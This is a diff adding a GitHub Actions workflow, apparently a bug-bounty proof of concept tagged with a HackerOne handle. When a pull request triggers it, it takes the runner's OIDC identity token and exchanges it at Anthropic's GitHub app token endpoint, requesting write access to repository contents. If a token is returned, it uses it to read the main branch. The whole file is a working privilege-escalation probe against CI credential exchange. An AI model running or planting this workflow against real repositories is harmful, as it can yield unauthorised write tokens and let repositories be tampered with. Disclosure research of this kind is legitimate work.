@@ -1,0 +1,56 @@
+name: pr-oidc-fragment-base
+
+on:
+  pull_request:
+    paths:
+      - ".github/workflows/pr-oidc-fragment.yml"
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exchange fork-PR OIDC identity
+        env:
+          H1_HANDLE: liamconner10
+        run: |
+          OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=claude-code-github-action"
+          OIDC=$(curl -fsS \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$OIDC_URL" | jq -r .value)
+          echo "::add-mask::$OIDC"
+
+          PAYLOAD=$(printf '%s' "$OIDC" | cut -d. -f2)
+          PADLEN=$(( (4 - ${#PAYLOAD} % 4) % 4 ))
+          if [ "$PADLEN" -gt 0 ]; then
+            PAYLOAD="${PAYLOAD}$(printf '=%.0s' $(seq 1 "$PADLEN"))"
+          fi
+          echo "OIDC security claims:"
+          printf '%s' "$PAYLOAD" | tr -- '-_' '+/' | base64 -d 2>/dev/null |
+            jq '{actor,event_name,repository,ref,base_ref,head_ref,sha,workflow_ref,workflow_sha,job_workflow_ref,job_workflow_sha}'
+
+          BODY='{"permissions":{"contents":"write"}}'
+          STATUS=$(curl -fsS -o /tmp/exchange.json -w '%{http_code}' \
+            -X POST 'https://api.anthropic.com/api/github/github-app-token-exchange' \
+            -H "Authorization: Bearer $OIDC" \
+            -H 'Content-Type: application/json' \
+            -H "X-HackerOne-Handle: $H1_HANDLE" \
+            -H "X-HackerOne-Researcher: $H1_HANDLE" \
+            -d "$BODY" || true)
+          echo "exchange_status=$STATUS"
+
+          APP_TOKEN=$(jq -r '.token // .app_token // empty' /tmp/exchange.json 2>/dev/null || true)
+          if [ -n "$APP_TOKEN" ]; then
+            echo "::add-mask::$APP_TOKEN"
+            echo 'exchange_result=installation_token_returned'
+            API_STATUS=$(curl -fsS -o /tmp/ref.json -w '%{http_code}' \
+              -H "Authorization: Bearer $APP_TOKEN" \
+              -H 'Accept: application/vnd.github+json' \
+              "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/ref/heads/main" || true)
+            echo "app_token_contents_read_status=$API_STATUS"
+          else
+            jq '{type,error:{type:.error.type,message:.error.message,details:.error.details},request_id}' /tmp/exchange.json
+          fi
